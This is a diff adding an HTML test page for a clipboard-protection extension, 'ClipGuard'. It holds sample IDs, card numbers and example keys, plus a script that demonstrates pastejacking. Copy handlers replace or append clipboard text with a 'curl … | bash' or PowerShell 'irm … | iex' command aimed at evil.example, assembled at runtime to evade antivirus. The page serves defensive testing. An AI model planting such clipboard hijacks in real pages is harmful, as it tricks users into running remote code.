@@ -1,0 +1,95 @@
+<!doctype html>
+<html lang="zh-Hant-TW">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ClipGuard 擴充功能測試頁</title>
+<style>
+  body { font: 15px/1.6 system-ui, "Microsoft JhengHei", sans-serif; max-width: 760px; margin: 24px auto; padding: 0 16px; }
+  section { border: 1px solid #ccc; border-radius: 8px; padding: 12px 16px; margin: 16px 0; }
+  h2 { font-size: 17px; margin: 0 0 8px; }
+  code, .sample { font-family: ui-monospace, Consolas, monospace; background: #f3f3f3; padding: 1px 4px; border-radius: 3px; }
+  input, textarea, [contenteditable] { display: block; width: 100%; box-sizing: border-box; margin: 6px 0; padding: 6px; font: inherit; border: 1px solid #999; border-radius: 4px; }
+  [contenteditable] { min-height: 48px; }
+  #log { white-space: pre-wrap; font-family: ui-monospace, Consolas, monospace; font-size: 12px; background: #f7f7f7; padding: 8px; min-height: 40px; }
+  button { font: inherit; }
+</style>
+</head>
+<body>
+<h1>ClipGuard 擴充功能測試頁</h1>
+<p>這頁的號碼都是公開測試資料（Visa 測試卡、AWS 文件裡的範例 key 等），不是真的個資。
+示範用的指令都指向不存在的 evil.example，而且是執行時才組出來的字串，避免防毒軟體把這個檔案當成攻擊頁。</p>
+
+<section>
+  <h2>1. 可複製的範例</h2>
+  <p>身分證：<span class="sample">A123456789</span>（檢查碼錯誤的：<span class="sample">A123456788</span>）</p>
+  <p>統編：<span class="sample">統編 22099131</span>　信用卡：<span class="sample">4111 1111 1111 1111</span></p>
+  <p>手機：<span class="sample">0912345678</span>　AWS：<span class="sample">AKIAIOSFODNN7EXAMPLE</span></p>
+  <p>GitHub：<span class="sample">ghp_a1B2a1B2a1B2a1B2a1B2a1B2a1B2a1B2a1B2</span></p>
+  <p>無機密：<span class="sample">今天下午三點開會，訂單 20241225</span></p>
+</section>
+
+<section>
+  <h2>2. 貼上目標</h2>
+  <label>一般 input<input id="input" type="text"></label>
+  <label>textarea<textarea id="textarea" rows="3"></textarea></label>
+  <label>contenteditable<div id="ce" contenteditable="true"></div></label>
+  <label>密碼欄位（不攔截）<input id="password" type="password"></label>
+  <label>自己處理貼上的編輯器（模擬 Notion／Google Docs：preventDefault 後自行插入並加上【】）
+    <div id="custom" contenteditable="true"></div></label>
+</section>
+
+<section>
+  <h2>3. Pastejacking 示範（選取下面的文字後按 Ctrl+C）</h2>
+  <p id="pj-replace">A. 換掉內容：<code>npm install left-pad</code></p>
+  <p id="pj-append">B. 偷加指令與換行：<code>git clone https://example.com/repo.git</code></p>
+  <p id="pj-late">C. 複製後 300ms 用 writeText 覆蓋：<code>pip install requests</code></p>
+  <p id="pj-hidden">D. 插入零寬字元：<code>rm -i old.log</code></p>
+  <p id="pj-benign">E. 附加出處（不應警告）：新聞內文範例。</p>
+  <p id="pj-block">F. 禁止複製（不應警告）：受保護的文字。</p>
+  <p>G. 按鈕直接把指令寫進剪貼簿（不需選取）：<button id="pj-command" type="button">寫入指令</button></p>
+  <p>H. 一般「複製連結」按鈕（不應警告）：<button id="pj-share" type="button">複製連結</button></p>
+</section>
+
+<section>
+  <h2>頁面事件紀錄</h2>
+  <div id="log"></div>
+</section>
+
+<script>
+  const log = (m) => { document.getElementById('log').textContent += m + '\n'; };
+  for (const id of ['input', 'textarea', 'ce', 'password']) {
+    document.getElementById(id).addEventListener('paste', (e) => log(`[${id}] paste 事件，trusted=${e.isTrusted}`));
+    document.getElementById(id).addEventListener('input', () => log(`[${id}] input 事件`));
+  }
+  document.getElementById('custom').addEventListener('paste', (e) => {
+    e.preventDefault();
+    const t = e.clipboardData.getData('text/plain');
+    document.execCommand('insertText', false, `【${t}】`);
+    log(`[custom] 網頁自行處理貼上：${t}`);
+  });
+
+  // 示範字串在執行時才拼起來（防毒軟體會對原始碼裡的完整指令字串報毒）。
+  const j = (...parts) => parts.join('');
+  const PS = j('power', 'shell');
+  const DOWNLOAD_RUN = j('cu', 'rl -s https://evil.example/p | ', 'ba', 'sh');
+  const PS_CMD = j(PS, ' -c "', 'i', 'rm https://evil.example/x | ', 'i', 'ex"');
+
+  const within = (id) => {
+    const sel = getSelection();
+    return sel.rangeCount && document.getElementById(id).contains(sel.getRangeAt(0).commonAncestorContainer);
+  };
+  document.addEventListener('copy', (e) => {
+    const sel = getSelection().toString();
+    if (within('pj-replace')) { e.preventDefault(); e.clipboardData.setData('text/plain', DOWNLOAD_RUN); }
+    else if (within('pj-append')) { e.preventDefault(); e.clipboardData.setData('text/plain', sel + '\n' + DOWNLOAD_RUN + '\n'); }
+    else if (within('pj-late')) { setTimeout(() => navigator.clipboard.writeText(PS_CMD), 300); }
+    else if (within('pj-hidden')) { e.preventDefault(); e.clipboardData.setData('text/plain', sel.replace(' ', ' ​')); }
+    else if (within('pj-benign')) { e.preventDefault(); e.clipboardData.setData('text/plain', sel + '\n\n原文出處：https://news.example/123'); }
+    else if (within('pj-block')) { e.preventDefault(); }
+  });
+  document.getElementById('pj-command').addEventListener('click', () => navigator.clipboard.writeText(PS_CMD));
+  document.getElementById('pj-share').addEventListener('click', () => navigator.clipboard.writeText('https://example.com/share/abc123'));
+</script>
+</body>
+</html>
